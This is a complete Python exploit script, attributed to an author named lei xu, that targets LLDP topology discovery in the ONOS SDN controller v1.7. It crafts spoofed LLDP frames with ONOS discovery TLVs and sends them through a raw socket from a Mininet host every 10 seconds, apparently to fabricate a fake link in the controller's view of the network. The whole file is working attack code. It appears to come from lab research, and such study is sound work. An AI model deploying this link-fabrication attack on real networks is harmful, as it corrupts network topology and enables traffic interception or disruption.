#!/usr/bin/python
"""
This is a hack to exploit the lldp vulnerabilities for ONOS controller v1.7, this program sends fake LLDP every 10 seconds.
author: lei xu
"""

#sudo mn --controller=remote,ip=192.168.56.102,port=6633 --topo linear,3

import sys
import socket
import time

from socket import  AF_PACKET, SOCK_RAW

#host port to injected switch
interface = 'h3-eth0'

mac_address = '\x00\x00\x00\x00\x00\x02'
lldp_multicast = "\x01\x80\xc2\x00\x00\x0e"

s = socket.socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))

chid = "\x00\x00\x00\x00\x00\x01"
port = "\x02"
swid = "\x31"
#craft fake lldp packet
lldp_pkt = ""
#chid + port_id + ttl + onos info + switch info
#chid
lldp_pkt += "\x02\x07\x04" + chid
#port id
lldp_pkt += "\x04\x05\x02\x00\x00\x00" + port
#120s ttl
lldp_pkt += "\x06\x02\x00\x78"
#ONOS discovery
lldp_pkt += "\xfe\x12\xa4\x23\x05\x01\x4f\x4e\x4f\x53\x20\x44\x69\x73\x63\x6f\x76\x65\x72\x79"
#
lldp_pkt += "\xfe\x17\xa4\x23\x05\x02\x6f\x66\x3a\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30" + swid
lldp_pkt += "\x00\x00"


src_addr = mac_address
dst_addr = lldp_multicast
payload = lldp_pkt
ethertype = "\x88\xcc"
packet = dst_addr+src_addr+ethertype+str(lldp_pkt)


while (True):
    s.send(packet)
    time.sleep(10)
